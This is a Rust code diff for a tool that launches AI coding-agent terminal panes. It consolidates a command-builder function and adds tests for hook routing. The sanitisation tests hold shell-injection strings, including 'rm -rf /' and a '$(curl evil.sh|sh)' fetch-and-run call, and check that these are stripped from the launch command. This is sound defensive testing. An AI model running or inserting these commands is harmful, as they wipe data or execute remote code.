@@ -107,10 +107,6 @@ fn changes_host_command() -> String {
     format!("{} pane-host --kind changes", shell_quote(&binary))
 }
 
-pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
-    preset_command_with_hooks(preset, session_id, None)
-}
-
 /// The same launch, plus the settings file that makes the pane report itself.
 ///
 /// `hook_settings` is the file `hook_install::claude_settings` produced,
@@ -120,8 +116,16 @@ pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
 /// `.codex/hooks.json` and `.cursor/hooks.json` that `install_project_hooks`
 /// merges into a worktree instead.
 ///
-/// Nothing about a launch with no settings file changes, which is what
-/// `preset_command` above still is.
+/// `hook_settings: None` is an ordinary launch and produces, byte for byte,
+/// the command this function produced before hooks existed.
+///
+/// **The only entry point, deliberately.** There was a two-argument
+/// `preset_command` beside this one, a thin delegate passing `None` — and once
+/// the four launch sites moved here it had no production caller left, only a
+/// shorter and more obvious name for the next person to reach for. This branch
+/// fixed "a launch path that reports nothing" twice already, at
+/// `split_terminal` and at `restart_terminal`; leaving a hookless builder in
+/// scope was leaving that trap set for a third time. Its tests call this now.
 pub fn preset_command_with_hooks(
     preset: &str,
     session_id: Option<&str>,
@@ -2801,9 +2805,9 @@ mod tests {
         // Startup files, version managers, direnv and aliases must behave like a
         // hand-launched terminal.
         // Quoted now, because a preset may carry a model.
-        assert!(preset_command("claude", None).contains("-ilc 'claude'"));
-        assert!(preset_command("shell", None).ends_with("-il"));
-        assert!(preset_command("cursor", None).contains("cursor-agent"));
+        assert!(preset_command_with_hooks("claude", None, None).contains("-ilc 'claude'"));
+        assert!(preset_command_with_hooks("shell", None, None).ends_with("-il"));
+        assert!(preset_command_with_hooks("cursor", None, None).contains("cursor-agent"));
     }
 
     /// The guard is asked about the path `add_root` canonicalized, so this asks
@@ -3137,30 +3141,30 @@ mod preset_tests {
 
     #[test]
     fn a_bare_preset_runs_the_agent() {
-        assert!(preset_command("claude", None).contains("'claude'"));
-        assert!(preset_command("codex", None).contains("'codex'"));
-        assert!(preset_command("cursor", None).contains("'cursor-agent'"));
-        assert!(preset_command("shell", None).ends_with("-il"));
+        assert!(preset_command_with_hooks("claude", None, None).contains("'claude'"));
+        assert!(preset_command_with_hooks("codex", None, None).contains("'codex'"));
+        assert!(preset_command_with_hooks("cursor", None, None).contains("'cursor-agent'"));
+        assert!(preset_command_with_hooks("shell", None, None).ends_with("-il"));
     }
 
     #[test]
     fn a_model_is_passed_through() {
-        assert!(preset_command("claude:opus", None).contains("claude --model opus"));
-        assert!(preset_command("codex:gpt-5.6-sol", None).contains("codex --model gpt-5.6-sol"));
+        assert!(preset_command_with_hooks("claude:opus", None, None).contains("claude --model opus"));
+        assert!(preset_command_with_hooks("codex:gpt-5.6-sol", None, None).contains("codex --model gpt-5.6-sol"));
     }
 
     #[test]
     fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
         // This string reaches a `-ilc` argument. Dropping it loses nothing real
         // and leaves no argument about quoting.
-        let out = preset_command("claude:opus'; rm -rf /; '", None);
+        let out = preset_command_with_hooks("claude:opus'; rm -rf /; '", None, None);
         assert!(!out.contains("rm -rf"));
         assert!(out.contains("'claude'"));
     }
 
     #[test]
     fn an_unrecognized_preset_that_is_not_an_identifier_runs_nothing() {
-        let out = preset_command("$(curl evil.sh|sh)", None);
+        let out = preset_command_with_hooks("$(curl evil.sh|sh)", None, None);
         assert!(!out.contains("curl"));
         assert!(out.ends_with("-il"), "falls back to a plain shell");
     }
@@ -3168,8 +3172,8 @@ mod preset_tests {
     #[test]
     fn a_custom_agent_name_still_works() {
         // Presets are not a closed set: someone's own wrapper should run.
-        assert!(preset_command("aider", None).contains("'aider'"));
-        assert!(preset_command("aider:sonnet", None).contains("aider --model sonnet"));
+        assert!(preset_command_with_hooks("aider", None, None).contains("'aider'"));
+        assert!(preset_command_with_hooks("aider:sonnet", None, None).contains("aider --model sonnet"));
     }
 
     /// The task brief writes this test with `Some("a-session")` and asserts
@@ -3209,10 +3213,24 @@ mod preset_tests {
 
     #[test]
     fn a_pane_with_no_hook_settings_is_the_command_it_always_was() {
+        // The task brief wrote this as an equality against a two-argument
+        // `preset_command`. That function is gone — it had no production
+        // caller and was a trap — and comparing this function against itself
+        // is a tautology, so the claim is made the way it should have been in
+        // the first place: against the literal string, which is what "nothing
+        // about an existing launch changes" actually means. A stray
+        // `--settings`, a lost `-ilc`, or the quoting drifting would all fail
+        // here; the equality could not have caught any of them.
+        let shell = farcooler_core::shell::login_shell();
         assert_eq!(
-            preset_command_with_hooks("claude", Some("s"), None),
-            preset_command("claude", Some("s")),
+            preset_command_with_hooks("claude", None, None),
+            format!("{shell} -ilc 'claude'"),
             "hooks are additive; nothing about an existing launch changes"
+        );
+        assert_eq!(
+            preset_command_with_hooks("claude:opus", Some("018f5b2c-0000-7000-8000-000000000000"), None),
+            format!("{shell} -ilc 'claude --model opus --session-id 018f5b2c-0000-7000-8000-000000000000'"),
+            "and the model and session id land exactly where they always did"
         );
     }
 
@@ -3226,7 +3244,7 @@ mod preset_tests {
         for preset in ["codex", "cursor", "shell", "aider", "claude-ish"] {
             let with = preset_command_with_hooks(preset, None, Some(Path::new("/tmp/fc/h.json")));
             assert!(!with.contains("--settings"), "{preset}: {with}");
-            assert_eq!(with, preset_command(preset, None), "{preset}: {with}");
+            assert_eq!(with, preset_command_with_hooks(preset, None, None), "{preset}: {with}");
         }
     }
 
@@ -3272,13 +3290,13 @@ mod preset_tests {
     fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
         // So that switching this pane to agent mode later is a lookup rather
         // than a guess about which of several .jsonl files is ours.
-        let cmd = preset_command("claude", Some("018f5b2c-0000-7000-8000-000000000000"));
+        let cmd = preset_command_with_hooks("claude", Some("018f5b2c-0000-7000-8000-000000000000"), None);
         assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
     }
 
     #[test]
     fn a_shell_is_not_given_a_session_id() {
-        let cmd = preset_command("shell", Some("018f5b2c-0000-7000-8000-000000000000"));
+        let cmd = preset_command_with_hooks("shell", Some("018f5b2c-0000-7000-8000-000000000000"), None);
         assert!(!cmd.contains("--session-id"), "{cmd}");
     }
 
@@ -3286,7 +3304,7 @@ mod preset_tests {
     fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
         // It ends up inside a `-ilc` string. The existing rule for models
         // applies here for the same reason.
-        let cmd = preset_command("claude", Some("; rm -rf /"));
+        let cmd = preset_command_with_hooks("claude", Some("; rm -rf /"), None);
         assert!(!cmd.contains("rm -rf"), "{cmd}");
         assert!(!cmd.contains("--session-id"), "{cmd}");
     }
@@ -3451,10 +3469,12 @@ mod restart_wiring_tests {
         // was launched with.
         //
         // `--session-id` is the tell, and it is a tell only this path has:
-        // it appears in `preset_command`'s claude arm and nowhere else, it
-        // names a NEW session rather than resuming one, and restoring
-        // `restart_terminal` to `preset_command(&term.command_preset,
-        // term.agent_session_id.as_deref())` puts it straight back.
+        // it appears in `preset_command_with_hooks`'s claude arm and nowhere
+        // else, it names a NEW session rather than resuming one, and
+        // restoring `restart_terminal` to
+        // `preset_command_with_hooks(&term.command_preset,
+        // term.agent_session_id.as_deref(), hook_settings.as_deref())` puts it
+        // straight back.
         //
         // There is deliberately no transcript planted for this session, so the
         // command lands on the clean-start branch. Planting one would mean
@@ -4766,6 +4786,228 @@ mod hook_wiring_tests {
     /// the shim path spent its first week: `listen` "was written, tested and
     /// never called" (`resume_agent_listeners`'s own doc, quoting
     /// `agent_supervisor::ensure_listening`'s note).
+    /// A pane in agent mode is fed by its shim; a hook must not feed it too.
+    ///
+    /// **The test that did not exist.** `agent_supervisor`'s
+    /// `a_recorded_event_continues_the_transcript_the_shim_started` documented
+    /// this hazard and deferred it on the premise that "nothing in this tree
+    /// writes any of those three files yet" — and six commits later, on this
+    /// same branch, `install_project_hooks` wrote `.codex/hooks.json` into
+    /// every worktree Far Cooler makes. Nothing noticed, because the only
+    /// place the question was written down was a comment, and a comment cannot
+    /// fail.
+    ///
+    /// This drives the route that made it live: codex, project-local hooks, no
+    /// `agent_session_id`, bound by worktree through `announced_terminal`.
+    ///
+    /// Two panes rather than one pane flipped between frames, and the first
+    /// draft was the flip — which failed, correctly, and taught the shape of
+    /// the test. `serve` reads a connection's lines in its own task, so
+    /// mutating the row between two writes races the read: the chat frame was
+    /// still queued when the row went back to terminal mode, and it bound
+    /// against the mode it was never sent under. Two panes in two worktrees
+    /// remove the race entirely — nothing is mutated at all, and one
+    /// connection's frames are handled in order, so the moment B's event
+    /// lands, A's frame has definitively been processed and refused.
+    #[tokio::test]
+    async fn a_pane_in_agent_mode_is_never_handed_a_hook_as_well() {
+        let dir = tempfile::tempdir().unwrap();
+        let service = Service::open_in(dir.path().join("state")).await.unwrap();
+        let root = service
+            .store
+            .create_repository_root(service.host_id, &dir.path().to_string_lossy(), now_millis())
+            .unwrap();
+        let repository = service
+            .store
+            .create_repository(
+                service.host_id,
+                root.id,
+                "repo",
+                &dir.path().join(".git").to_string_lossy(),
+                "",
+            )
+            .unwrap();
+
+        // Two worktrees, one codex pane each, so every announcement below
+        // binds unambiguously by `cwd` and nothing has to be mutated mid-test.
+        let mut panes = Vec::new();
+        for (name, mode) in [("chat", models::PaneMode::Agent), ("plain", models::PaneMode::Terminal)]
+        {
+            let worktree = dir.path().join(name);
+            std::fs::create_dir_all(&worktree).unwrap();
+            let workspace = service
+                .store
+                .create_workspace(repository.id, name, &worktree.to_string_lossy(), false)
+                .unwrap();
+            let term = service
+                .store
+                .create_terminal(workspace.id, name, "codex", TerminalIntent::Running, 80, 24)
+                .unwrap();
+            // No session id, which is what a codex pane always has: nothing
+            // mints one at launch. That is exactly the shape
+            // `announced_terminal` admits, and the reason the pane mode is the
+            // only thing left that can refuse it.
+            let term = service
+                .store
+                .set_pane_mode(term.id, term.resource_version, mode, None)
+                .unwrap();
+            assert_eq!(term.pane_mode, mode);
+            panes.push((worktree, term));
+        }
+        let (chat_worktree, chat) = panes[0].clone();
+        let (plain_worktree, plain) = panes[1].clone();
+
+        service.resume_agent_listeners();
+        let socket = hook_ingress::HookIngress::socket_path(&service.root);
+        let mut stream = None;
+        for _ in 0..200 {
+            if let Ok(s) = tokio::net::UnixStream::connect(&socket).await {
+                stream = Some(s);
+                break;
+            }
+            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        }
+        let mut stream =
+            stream.unwrap_or_else(|| panic!("nothing is listening on {}", socket.display()));
+
+        let frame = |cwd: &Path, session: &str, prompt: &str| {
+            serde_json::to_string(&serde_json::json!({
+                "agent": "codex",
+                "event": "UserPromptSubmit",
+                "payload": {
+                    "session_id": session,
+                    "cwd": cwd.to_string_lossy(),
+                    "prompt": prompt,
+                },
+            }))
+            .unwrap()
+        };
+
+        for line in [
+            frame(&chat_worktree, "a-chats-session", "this pane has a shim"),
+            frame(&plain_worktree, "a-plain-session", "this pane has only hooks"),
+        ] {
+            stream.write_all(format!("{line}\n").as_bytes()).await.unwrap();
+        }
+        stream.flush().await.unwrap();
+
+        let texts = |service: &Service, id: Uuid| -> Vec<String> {
+            service
+                .agents
+                .replay(id, 0, 0)
+                .1
+                .iter()
+                .filter_map(|s| match &s.event {
+                    farcooler_agent::event::AgentEvent::Message { text, .. } => Some(text.clone()),
+                    _ => None,
+                })
+                .collect()
+        };
+
+        // The barrier. A negative over a socket cannot be proven by waiting a
+        // while and finding nothing — that passes just as well against a
+        // listener that is broken, or one that never bound at all. The second
+        // frame landing is what says the first was read, routed and refused.
+        let mut landed = Vec::new();
+        for _ in 0..400 {
+            landed = texts(&service, plain.id);
+            if !landed.is_empty() {
+                break;
+            }
+            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        }
+        assert_eq!(
+            landed,
+            vec!["this pane has only hooks".to_string()],
+            "a terminal-mode pane's hook still reaches it; without this the test below proves nothing"
+        );
+
+        assert!(
+            texts(&service, chat.id).is_empty(),
+            "the agent-mode pane's transcript belongs to its shim alone, got {:?}",
+            texts(&service, chat.id)
+        );
+    }
+
+/// The other route into the same defect, and the reason the guard is on
+    /// `terminal_for` rather than only inside `announced_terminal`.
+    ///
+    /// A pane that DOES name a session routes by the claimants join and never
+    /// reaches the announcement path at all. That route is live for both
+    /// agents that can be in agent mode: claude's id comes from `--session-id`
+    /// at launch, and codex's from the shim's own `Established` report, which
+    /// `set_pane_mode` stores (see its comment on preferring the shim's id).
+    /// So an agent-mode pane carrying a session id is exactly as double-fed as
+    /// one carrying none, by a different path, and a fix that guarded only the
+    /// announcement would have left it.
+    #[tokio::test]
+    async fn a_chat_that_names_its_session_is_refused_by_the_other_route_too() {
+        let dir = tempfile::tempdir().unwrap();
+        let service = Service::open_in(dir.path().join("state")).await.unwrap();
+        let root = service
+            .store
+            .create_repository_root(service.host_id, &dir.path().to_string_lossy(), now_millis())
+            .unwrap();
+        let repository = service
+            .store
+            .create_repository(
+                service.host_id,
+                root.id,
+                "repo",
+                &dir.path().join(".git").to_string_lossy(),
+                "",
+            )
+            .unwrap();
+        let workspace = service
+            .store
+            .create_workspace(repository.id, "main", &dir.path().to_string_lossy(), true)
+            .unwrap();
+        let term = service
+            .store
+            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
+            .unwrap();
+
+        let facts = farcooler_agent_hooks::facts::Facts {
+            session_id: Some("a-declared-session".to_string()),
+            cwd: Some(dir.path().to_path_buf()),
+            transcript_path: None,
+        };
+
+        // In terminal mode the join binds, which is the whole hook feature and
+        // is what makes the refusal below mean something.
+        let term = service
+            .store
+            .set_pane_mode(
+                term.id,
+                term.resource_version,
+                models::PaneMode::Terminal,
+                Some("a-declared-session".to_string()),
+            )
+            .unwrap();
+        assert_eq!(
+            service.hooks.terminal_for(&facts, farcooler_agent_hooks::Agent::Claude),
+            Some(term.id),
+            "a terminal-mode pane that names this session is exactly who the hook is for"
+        );
+
+        // The same row, the same session, the same facts. Only the mode moves.
+        let term = service
+            .store
+            .set_pane_mode(
+                term.id,
+                term.resource_version,
+                models::PaneMode::Agent,
+                Some("a-declared-session".to_string()),
+            )
+            .unwrap();
+        assert_eq!(term.pane_mode, models::PaneMode::Agent);
+        assert_eq!(
+            service.hooks.terminal_for(&facts, farcooler_agent_hooks::Agent::Claude),
+            None,
+            "a chat's conversation arrives over its shim; the hook must go nowhere"
+        );
+    }
+
     #[tokio::test]
     async fn a_codex_hooks_own_transcript_reaches_the_terminals_transcript() {
         let dir = tempfile::tempdir().unwrap();
